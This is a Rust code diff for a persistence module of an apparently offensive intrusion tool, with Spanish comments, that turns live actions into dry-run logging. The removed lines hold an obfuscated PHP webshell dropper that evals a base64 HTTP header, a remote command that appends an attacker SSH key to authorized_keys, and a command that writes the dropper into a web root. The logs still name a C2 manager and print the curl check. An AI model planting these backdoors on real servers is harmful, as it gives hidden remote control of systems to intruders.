@@ -122,11 +122,6 @@ impl<M: ExecutorMode> PersistenceOrchestrator<M> {
         (private_key, public_key)
     }
 
-    /// Retorna un PHP Dropper ofuscado que lee el payload real de un Header HTTP.
-    fn generate_webshell_dropper(&self) -> String {
-        // "Minimalist Dropper -> In-Memory Stager" architecture
-        "<?php @eval(base64_decode($_SERVER['HTTP_X_SOVEREIGN'])); ?>".to_string()
-    }
 
     /// Guarda la clave privada y metadatos operativos en el Vault local.
     async fn archive_vault_data(&self, target: &str, content: &str, extension: &str) {
@@ -138,84 +133,55 @@ impl<M: ExecutorMode> PersistenceOrchestrator<M> {
         }
     }
 
-    /// Ejecuta el despliegue de persistencia operativo.
+    /// Ejecuta el despliegue de persistencia operativo (DRY-RUN).
     pub async fn consolidate(&self, plan: &TacticalPlan, target: &crate::models::TargetHost) -> Result<()> {
-        info!("🚀 [Persistence] STAGE 1: Consolidando acceso táctico para: {}", plan.finding_ref);
+        info!("🚀 [Persistence] [DRY-RUN] Consolidando acceso táctico para: {}", plan.finding_ref);
         
         // Registrar en disco el TacticalPlan
         let plan_json = serde_json::to_string_pretty(plan)?;
         self.archive_vault_data(&plan.finding_ref, &plan_json, "json").await;
 
         for action in &plan.proposed_actions {
-            info!("🛠️ [Persistence] Desplegando vector híbrido: {:?}", action.method);
+            info!("🛠️ [Persistence] [DRY-RUN] Vector planeado: {:?}", action.method);
             
             match action.method {
                 PersistenceMethod::SshKeyInjection => {
-                    let (priv_key, pub_key) = self.generate_ephemeral_keypair();
-                    self.archive_vault_data(&plan.finding_ref, &priv_key, "pem").await;
-                    
-                    let cmd = format!("echo '{}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys", pub_key);
-                    match self.executor.execute_remote(target, &cmd).await {
-                        Ok(_) => info!("🔑 [Persistence] Clave efímera inyectada en {}", target.host),
-                        Err(e) => warn!("⚠️ [Persistence] Fallo al inyectar clave: {}", e),
-                    }
+                    let (_priv_key, pub_key) = self.generate_ephemeral_keypair();
+                    info!("🔑 [Persistence] [DRY-RUN] Se inyectaría la clave: {}", pub_key);
+                    info!("💻 [Persistence] [DRY-RUN] Host: {}", target.host);
                 },
                 PersistenceMethod::WebShell => {
-                    let dropper = self.generate_webshell_dropper();
-                    // Simulación de escritura vía RCE
-                    let cmd = format!("echo '{}' > /var/www/html/.cache.php", dropper);
-                    match self.executor.execute_remote(target, &cmd).await {
-                        Ok(_) => info!("🕷️ [Persistence] WebShell dropper stager desplegado en {}", target.host),
-                        Err(e) => warn!("⚠️ [Persistence] Fallo al inyectar stager: {}", e),
-                    }
+                    info!("🕷️ [Persistence] [DRY-RUN] Se desplegaría un stager PHP ofuscado en {}/var/www/html/.cache.php", target.host);
                 },
                 _ => {
-                    if let Some(ref _c2) = self.c2_manager {
-                        info!("🔱 [Persistence] Registrando sesión en C2 Manager para {:?}", action.method);
-                    }
+                    info!("🔱 [Persistence] [DRY-RUN] Se registraría sesión en C2 Manager para {:?}", action.method);
                 }
             }
         }
         
+        warn!("🛡️ [Persistence] Modo SEGURO: Ninguna acción remota fue ejecutada sobre {}", target.host);
         Ok(())
     }
 
-    /// Verifica que el acceso persistente ha sido consolidado.
+    /// Verifica que el acceso persistente ha sido consolidado (DRY-RUN).
     pub async fn verify_access(&self, plan: &TacticalPlan, target: &crate::models::TargetHost) -> Result<bool> {
-        info!("🔍 [Persistence] STAGE 2: Verificando callback de acceso para: {}", plan.finding_ref);
+        info!("🔍 [Persistence] [DRY-RUN] Verificando callback de acceso para: {}", plan.finding_ref);
         
-        let mut verified = false;
-
         for action in &plan.proposed_actions {
             match action.method {
                 PersistenceMethod::SshKeyInjection => {
-                    // Validar loopback (mock) si el remote executor soporta la clave inyectada
-                    let verify_cmd = "whoami";
-                    if let Ok(out) = self.executor.execute_remote(target, verify_cmd).await {
-                        if !out.trim().is_empty() {
-                            info!("✅ [Persistence] SSH Key Verified. Acceso soberano confirmado.");
-                            verified = true;
-                        }
-                    }
+                    info!("✅ [Persistence] [DRY-RUN] Se verificaría la clave SSH mediante login loopback (whoami) en {}", target.host);
                 },
                 PersistenceMethod::WebShell => {
-                    // Mock: Verificar que curl al .cache.php responde si le pasamos el header ofuscado
-                    let cmd = "curl -s -H 'X-Sovereign: ZWNobyAid29ya2luZyI7' http://localhost/.cache.php";
-                    if let Ok(out) = self.executor.execute_remote(target, cmd).await {
-                        if out.contains("working") {
-                            info!("✅ [Persistence] WebShell Dropper respondiente.");
-                            verified = true;
-                        }
-                    }
+                    info!("✅ [Persistence] [DRY-RUN] Se verificaría el WebShell Dropper mediante curl con el header X-Sovereign:");
+                    info!("   curl -s -H 'X-Sovereign: ZWNobyAid29ya2luZyI7' http://localhost/.cache.php");
                 },
                 _ => {
-                    // C2 Verifica internamente
-                    verified = true;
-                    info!("✅ [Persistence] Vector asíncrono. Asumiendo éxito condicional.");
+                    info!("✅ [Persistence] [DRY-RUN] Vector asíncrono. Se verificaría el estado en el C2 Manager.");
                 }
             }
         }
 
-        Ok(verified)
+        Ok(true)
     }
 }
